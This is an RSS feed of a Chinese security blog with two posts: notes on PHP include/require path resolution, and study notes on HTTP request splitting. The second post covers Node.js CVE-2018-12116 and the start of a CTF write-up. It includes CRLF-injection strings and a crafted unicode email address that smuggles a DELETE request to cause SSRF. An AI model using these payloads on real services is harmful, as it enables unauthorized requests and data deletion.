<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NOTES&amp;SUMMARY on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/notessummary/</link><description>Recent content in NOTES&amp;SUMMARY on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 13 Dec 2021 01:12:22 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/notessummary/index.xml" rel="self" type="application/rss+xml"/><item><title>关于include/require(_once)的易混淆点</title><link>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</link><pubDate>Mon, 13 Dec 2021 01:12:22 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</guid><description>&lt;p>之前做题遇到后查了一下相关文章，觉得很适合出题，但是感觉不能为了考而考，也就失去了CTF的意义，所以还不如先发出来这一篇&lt;/p>
&lt;p>&lt;del>（别骂了 就是懒&lt;/del>&lt;/p>
&lt;h2 id="关于includerequire_once">关于&lt;code>include/require(_once)()&lt;/code>&lt;/h2>
&lt;p>这几个函数应该都不陌生（还应该再加上include_path），干的是文件包含的事；先按照给定参数寻找路径（当定义了路径则会完全忽略include_path），如果只有文件名则按照include_path的指定目录寻找，如果还没找到则会在调用脚本文件所在的目录和当前工作目录下寻找；下面说几个小点&lt;/p>
&lt;p>首先是require和include的区别在于require在出错时会产生E_COMPILE_ERROR级别的错误，脚本将中止运行，而include只会产生警告E_WARNING，不影响继续顶着错误继续执行脚本（做题很常见这个 无数的报错下面有正常的回显）&lt;/p>
&lt;p>另一个区别在于require是无条件包含函数，即程序执行前就会将文件内容以文本替换的形式引入（所以这份文件只被处理一次），让它变为php脚本的一部分（所以通常放在php文件的最前面）；include则是有条件包含函数，用到时才被加载，且每次执行文件时都要进行读取和评估&lt;/p>
&lt;p>当php遇到require/include(_once)函数时，如果给定的参数是个绝对路径则直接引入，但如果给的是相对路径，则要进入另外的逻辑（经过多次调用，宏展开后进入_php_stream_fopen_with_path）寻找此文件；在_php_stream_fopen_with_path会根据include_path和当前执行文件的path组成一个待选的目录列表，然后从列表头部开始根据DEFAULT_DIR_SEPARATOR（linux下默认为&lt;code>:&lt;/code> win为&lt;code>;&lt;/code>）取出路径，然后拼上文件名，如果成功则返回，失败则继续下一个待选择路径（&lt;u>所以如果有重名的就好玩了&lt;/u>）&lt;/p>
&lt;h2 id="几个好玩的小栗子">几个好玩的小栗子&lt;/h2>
&lt;p>这里举一个小栗子，文件结构和内容如下（注意这里include_path的写法!!!不仅有path_to_subdir还有&lt;code>:&lt;/code>分隔符前面代表的current_dir!!!）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095717109.png" alt="image-20211024095717109">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095830345.png" alt="image-20211024095830345">&lt;/p>
&lt;p>在不同的情况下运行看看效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024100007587.png" alt="image-20211024100007587">&lt;/p>
&lt;p>在root目录下执行时，直接根据1.php的include_path寻找2.php，而2.php中并没有设置include_path，那么路径就变成了列表中第一个待选择路径 即&lt;code>&amp;quot;.&amp;quot;&lt;/code>，而当前工作目录是root，所以就是/root/3.php的输出&lt;/p>
&lt;p>换到subdir目录下执行1.php时，列表中第一个待选择路径&lt;code>&amp;quot;.&amp;quot;&lt;/code>变为了subdir，自然输出变为了/root/subdir/3.php的输出&lt;/p>
&lt;p>现在我们把include_path仅保留path_to_subdir，继续上面的指令运行一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024190934131.png" alt="image-20211024190934131">&lt;/p>
&lt;p>那不管当前路径是什么都会得到subdir的输出&lt;/p>
&lt;p>再进一步，在2.php中半道清空include_path会怎么样呢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024191919122.png" alt="image-20211024191919122">&lt;/p>
&lt;p>我们发现跟上面结果一样，但是这里的逻辑却有差异：2.php中清空include_path后再包含文件将会自动变为current_path的路径，而2.php在/root/subdir下，所以回显和2.php的路径保持一致&lt;/p>
&lt;p>再再进一步&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024192931075.png" alt="image-20211024192931075">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024193020147.png" alt="image-20211024193020147">&lt;/p>
&lt;p>诶，可以看到由于这里两次都用到了相对目录的&lt;code>&amp;quot;./&amp;quot;&lt;/code>进行引用，所以在/root目录下运行很顺畅，而/root/subdir目录下由于不会再存在./subdir/2.php，所以报错退出&lt;/p>
&lt;h2 id="使用注意">使用注意&lt;/h2>
&lt;ul>
&lt;li>在使用include_path和相对路径时会影响性能，所以最好用绝对路径&lt;/li>
&lt;li>目录相对路径的basedir永远是当前工作路径&lt;/li>
&lt;li>可以通过&lt;code>__DIR__&lt;/code>来获得绝对路径&lt;/li>
&lt;li>建议少使用&lt;code>include/require_once&lt;/code>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>*写的不全面，还有一部分需要补充 先鸽了，遇到题或者具体的应用场景我补充上来&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.laruence.com/2010/05/04/1450.html">深入理解PHP之require/include顺序&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>HTTP请求切分攻击学习笔记</title><link>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</link><pubDate>Tue, 07 Dec 2021 02:24:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</guid><description>&lt;p>说到与HTTP请求有关的攻击方式能想到什么？&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205111212810.png" alt="image-20211205111212810">&lt;/p>
&lt;p>&lt;del>是不是一下子恍然大明白了&lt;/del>&lt;/p>
&lt;p>这一篇就是其中HTTP Request Splitting的学习笔记，长期更新；其它模块的也会随后更新~&lt;/p>
&lt;p>老规矩，所有的参考链接&amp;amp;docker链接放到文末&lt;/p>
&lt;h2 id="nodejs-http请求路径中的unicode字符损坏">Node.js: http请求路径中的unicode字符损坏&lt;/h2>
&lt;blockquote>
&lt;p>使用Node.js向特定路径发出http请求，但是却被定向到了不一样的路径&lt;/p>
&lt;/blockquote>
&lt;p>虽然用户发出的http请求通常是个字符串string，但Node.js最终必须将请求以原始字节raw bytes输出，js支持unicode，这其中涉及到了unicode编码转换。对于不包含body的请求，Node.js默认使用&lt;code>latin1&lt;/code>，它是单字节编码，不能表示高编号的unicode字符，比如emoji 🐶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">v&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/caf\u{E9}\u{01F436}&amp;#39;&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103409976.png" alt="image-20211205103409976">&lt;/p>
&lt;p>两字节的unicode编码用&lt;code>latin1&lt;/code>转换为单字节时会被截去开头的第一个字节&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{5b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{015b}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{0128}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;\u{28}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205103625305.png" alt="image-20211205103625305">&lt;/p>
&lt;hr>
&lt;p>那这个Node.js的安全问题跟SSRF又是怎么联系到一起的呢？处理用户输入时出现了数据损坏是个明显的危险信号&lt;/p>
&lt;h2 id="http-request-splitting">HTTP Request Splitting&lt;/h2>
&lt;blockquote>
&lt;p>&lt;em>This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>通俗来说，就是原本1个请求对应1次响应，现在我们对请求的body部分再添加1个请求，导致看似发送了1次请求实则会被解释为2个响应被加载出来，会造成XSS和SSRF&lt;/p>
&lt;p>举一个简单的小栗子：一般的请求形式是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=&amp;lt;user-input-here&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是我们构造了这样的用户输入&lt;/p>
&lt;pre tabindex="0">&lt;code>x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n
&lt;/code>&lt;/pre>&lt;p>当请求发出后，服务端将会收到这样的请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private-api?q=x&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
DELETE /private-api HTTP/1.1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>包含了两个请求方式，如果服务端没有设置特殊的过滤则可能会将两个请求全部执行并回显；而如果第二个额外的请求包含一些只有服务端本地才能访问到的内容，则会造成SSRF(Server-Side Request Forgery)&lt;/p>
&lt;h2 id="ssrf-via-request-splitting--cve-2018-12116">SSRF via Request Splitting / cve-2018-12116&lt;/h2>
&lt;p>正如上面栗子展示的那样，不过一般http库都会对这种行为做出防范；Node.js也不例外，比如&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://gqa6995cu69dkt0oxvzzzwzt0k6auz.burpcollaborator.net/\r\n/test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160107403.png" alt="image-20211205160107403">&lt;/p>
&lt;p>换成unicode呢？画风开始奇怪了&lt;/p>
&lt;pre tabindex="0">&lt;code>'http://example.com/\u{010D}\u{010A}/test'
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205160205490.png" alt="image-20211205160205490">&lt;/p>
&lt;p>上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造&lt;code>\r\n&lt;/code>了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://example.com/\u{010D}\u{010A}/test&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205164009244.png" alt="image-20211205164009244">&lt;/p>
&lt;p>当Node.js&amp;lt;=8构造对这样的url请求时，由于他们不是HTTP控制字符所以不会修改，原样输出；而结合上面我们提过的unicode截去开头第一个字节的事情，我们就可以构造&lt;code>\r\n&lt;/code>的CRLFi了&lt;/p>
&lt;p>现在的Node.js均已修复此问题，官方修复-&amp;gt;&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163601837.png" alt="image-20211205163601837">&lt;/p>
&lt;p>旧版中会直接对解释不了的unicode报错，而不是尝试原封不动的搬过去请求&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205163703908.png" alt="image-20211205163703908">&lt;/p>
&lt;h3 id="真实场景下的案例">真实场景下的案例&lt;/h3>
&lt;p>来自-&amp;gt;&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a> 强烈建议看原文&lt;/p>
&lt;p>火狐邮箱账号的客户端与服务器后端交互流程是这样的&lt;/p>
&lt;pre tabindex="0">&lt;code> +--------+ +--------+ +-----------+ +----------+
| Client | HTTP | API | HTTP | DataStore | SQL | MySQL |
| |&amp;lt;------&amp;gt;| Server |&amp;lt;------&amp;gt;| Service |&amp;lt;-----&amp;gt;| Database |
+--------+ +--------+ +-----------+ +----------+
&lt;/code>&lt;/pre>&lt;p>客户端发出的请求是通过http与API Server交互的，比如一个这样的请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">GET /email/74657374406578616d706c652e636f6d
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>会得到&lt;code>test@example.com&lt;/code>的邮件记录，用hex做了请求的路由，但是一个删除操作却是直接拼接字符串&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">DELETE /account/xyz/emails/test@example.com
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时，最后的端点可控，结合上面的bug，当我们注册这样一个账号&lt;/p>
&lt;pre tabindex="0">&lt;code>x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc
&lt;/code>&lt;/pre>&lt;p>它其实是这样&lt;/p>
&lt;pre tabindex="0">&lt;code>v = 'x@̠ňƆƆɐį1̮1č̊č̊ɆͅƆ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňƆƆɐį1̮1č̊č̊.cc'
Buffer.from(v.toLowerCase(), &amp;quot;latin1&amp;quot;).toString()
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205205928287.png" alt="image-20211205205928287">&lt;/p>
&lt;p>&lt;del>真是Node.js的美妙特性&lt;/del>&lt;/p>
&lt;p>对这样一个账号再次进行DELETE请求时则会这样&lt;/p>
&lt;pre tabindex="0">&lt;code>console.log(Buffer.from('DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@̠ňɔɔɐį1̮1č̊č̊ɇͅɔ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňɔɔɐį1̮1č̊č̊.cc', 'latin1').toString())
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210133004.png" alt="image-20211205210133004">&lt;/p>
&lt;p>SSRF来了&lt;/p>
&lt;h2 id="asisctf-final-2018proxy-proxy">[ASISCTF final 2018]Proxy-Proxy&lt;/h2>
&lt;p>简单审了一下代码，标记到注释中了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body_parser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;x-date&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">body_parser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">}));&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;view engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;jade&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#00a8c8">of&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
